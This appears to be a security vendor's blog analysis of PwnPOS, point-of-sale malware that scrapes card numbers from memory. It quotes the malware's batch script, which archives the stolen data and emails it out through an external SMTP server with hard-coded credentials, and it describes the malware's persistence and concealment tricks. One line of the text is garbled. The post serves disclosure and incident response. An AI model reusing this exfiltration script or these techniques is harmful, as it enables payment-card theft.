This malware may have been active since 2013, possibly\nearlier. Trend Micro will be naming this new malware family as PwnPOS to differentiate it from other [known PoS malware families. In this blog](http://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/the-evolution-of-pos-ram-scraper-malware)\npost, we will discuss the technical details of this PoS malware. Researchers and incident response teams can add our findings to their growing\nnumber of PoS malware indicators. Technical Summary PwnPOS is one of those perfect examples of malware that’s able to fly under the\nradar all these years due to its simple but thoughtful construction; albeit not being future proof. Technically, there are two components of\nPwnPOS: 1) the RAM scraper binary, and 2) the binary responsible for data exfiltration. While the RAM scraper component remains constant,\nthe data exfiltration component has seen several changes – implying that there are two, and possibly distinct, authors. The RAM scraper goes\nthrough a process’ memory and dumps the data to the file and the binary uses SMTP for data exfiltration. Installation This malware family is a\nRAM scraper service that can install and remove itself via specific arguments. If run without any arguments, it will copy itself to\n_%SystemRoot%\\system32\\wnhelp.exe, install a service called “Windows Media Help,” and automatically start itself with the -service switch._\n_Figure 1. Installed service_\n\nHowever, if with argument del, it will remove the service without deleting the file.\n_Figure 2. Service deletion routine_\n\nMost incident response and malware-related tools attempt to enumerate auto-run, auto-start or items that have an entry within the services\napplet in attempt to detect malicious files. Thus, having parameters that add and remove itself from the list of services allows the attacker to\n“remain persistent” on the target POS machine when needed, while allowing the malicious file to appear benign as it waits within the\n_%SYSTEM$ directory for the next time it is invoked. There are a few caveats about the malware’s installation routine:_\n\n1. The Windows OS’ User Account Control feature (available since Windows Vista) is able to block its execution. The initial launch would be\n\nstored in %SystemRoot%\\system32\\DebugConsole.log and upon execution, it checks for administrator privilege. If it determines that the\nuser session does not have administrator privilege, then it would output an error ERRLOG:error: not admin user.\n2. The file exe requires being within %SystemRoot%\\system32 as the service it creates uses this path to the executable\n\n_C:\\WINDOWS\\system32\\wnhelp.exe -service. If executed within a 64-bit Operating System, the executed would be stored within_\n_C:\\Windows\\SysWOW64\\ and thus the service itself fails to start._\n\nThe above-mentioned caveats may be a non-issue since a good majority of PoS terminals are still running on Windows XP and there is no\npressing need for 64-bit operating system installations in these kinds of systems. Memory Scraping After the service starts, it grants\n_SeDebugPrivilege permission and enumerates all running processes._\n_Figure 3. Enumeration of memory block_\n\nIt then seeks for a specific pattern [0-9]*=, which is a set of numbers, to which the search result will be stored in\n_%SystemRoot%\\system32\\prefb419.dat. It should be noted that it may seem normal to have %SystemRoot%\\system32\\pref*.dat files as they_\nrepresent Microsoft Windows’ base performance counters.\n_Figure 4. Reading memory and searching for pattern_\n\n[If the string of numbers is found within a memory space, it validates the string via the Luhn algorithm, a known checksum formula to validate a](http://en.wikipedia.org/wiki/Luhn_algorithm)\nvariety of identification numbers, in order to make sure it is a credit card number.\n_Figure 5. Luhn algorithm_\n\nThe log format that’s written to the file perfb419.dat is (DateTime): (ProcessName) pid: (Process Id) (Context).\n\n%Y.%m.%d %H:%M:%S: => 2015.01.22 12:12:12\nProcess Name => ???.exe\nProcess ID => 999\nContext => Credit Card Number\n\n\n-----\n\ne a b oc o e ecut o epeats a te a e seco ds, e u e at g t e p ocesses a d go g t oug eac e o y b oc to oo o\nsignificant strings of numbers as indicated above. Data Exfiltration The data that is stored in perf419.dat may be harvested by two different\nbinaries:\n\n**ccb91409ed05d4dcd45d691908f8df3ff6728d10 is packed via MPRESS and is seemingly coded via the cross-platform Purebasic**\nprogramming language. Text included in the file contains both English and German language – seemingly used for system-generated\nmessages.\n_Figure 6. English and German text_\n\nUpon execution, drops a file called win32.bat that contains the following lines that contains most of the data exfiltration routine. Below is\nthe content of win32.bat:\n\n@echo off 7z.exe a backup.7z perfb419.dat -pmanadeaur1qaz2wsx echo uniq > perfb419.dat snd.exe -smtp 37.59.26.94 -port 465\n-t dumps.dumps@{BLOCKED}.com -f dumps@{BLOCKED}.cc -sub \"Raport de la %computername%\" -user\ndumps@{BLOCKED}.cc -pass 1234qwer -ssl -auth-login -attach backup.7z -M Hello DEL backup.7z DEL syshealth.7z DEL\nsyshealth.log\n\n[The routine is pretty much easy to understand: it first uses 7z.exe (standalone 7-zip executable) to create an archive called backup.7z](http://www.7-zip.org/)\nfrom perfb419.dat, and uses a password defined as manadeaur1qaz2wsx. Note that this assumes also that this binary is within the same\nfile directory of perfb419.dat. After that, it uses another standalone executable called snd.exe (from this [mailsend project) to send an](https://github.com/muquit/mailsend)\nemail to a pre-defined mail account via SMTP with SSL and authentication. Finally, it proceeds to clean up the files it used for this\nroutine.\n**7a8b966afdacbf174bec8588728d12bed9b56369 is an AutoIt-compiled executable that is packed via UPX. It has pre-defined variables**\n(e.g., SMTP server, sender, recipient, attachments) within the lines of its decompiled code as seen below.\n_Figure 7. AutoIt variable declaration_\n\nSimilarly, this binary uses 7z.exe to pack the interesting data and uses email for data exfiltration, but it comes with enhancements:\n\n1. It uses grep.exe, [a tool that matches one or more input files for lines containing a match to a specified pattern, to match the string](http://gnuwin32.sourceforge.net/packages/grep.htm)\n\nformat mentioned above which, as you guessed, matches the lines within in perfb419.dat.\n2. Rather than utilizing a third-party executable to send email, it utilizes a known AutoIt routine that makes use of the Collaboration\n\nData Objects (CDO) API suite that is built-in with Microsoft Windows.\nWhat is further interesting in this the fact that the recipient is that the recipient has a misspelled top-level domain (TLD) with\n_{BLOCKED}@gmail.coom. What would happen here is that the originating sender—in this case, gomis@{BLOCKED}.{BLOCKED}--_\nwould receive a bounced message, usually with the original mail content – thus making the use of a common email problem called\n[“backscatter” to good use.](http://en.wikipedia.org/wiki/Backscatter_%28email%29)\n\n**_Significant strings Significant strings for the data exfiltration components are already listed in code blocks above. However, for the RAM_**\nscraper service, we can definitely see two significant strings that can tell us a little bit about the author(s) as the character encoding is\nsignificant as it always converts the output strings into a very specific encoding:\n\nThe Program Database File (PDB) c:\\r1\\Release\\r1.pdb\n\nCharacter Encoding Russian_Russia.1251\n\n**_So where have we seen this? We have seen PwnPOS operating with other PoS malware like BlackPOS and Alina, among small-to-medium_**\nbusinesses (SMB) within Japan, APAC (Australia, India), NABU (United States and Canada) and EMEA (Germany, Romania) running 32-bit\nversions of either Windows XP or Windows 7.
